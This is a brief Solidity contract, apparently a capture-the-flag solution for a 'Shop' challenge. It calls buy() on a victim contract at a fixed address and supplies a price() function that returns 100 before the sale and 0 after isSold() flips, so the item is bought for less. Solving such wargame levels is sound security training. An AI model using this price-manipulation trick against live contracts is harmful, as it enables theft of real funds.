// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Shop.sol";

contract Solve {
    function run() external {
        Shop victim = Shop(0xb4B22986bDEf171bc52FEe1f4fC9D464f05E1dF6);
        victim.buy();
    }

    function price() external view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }
}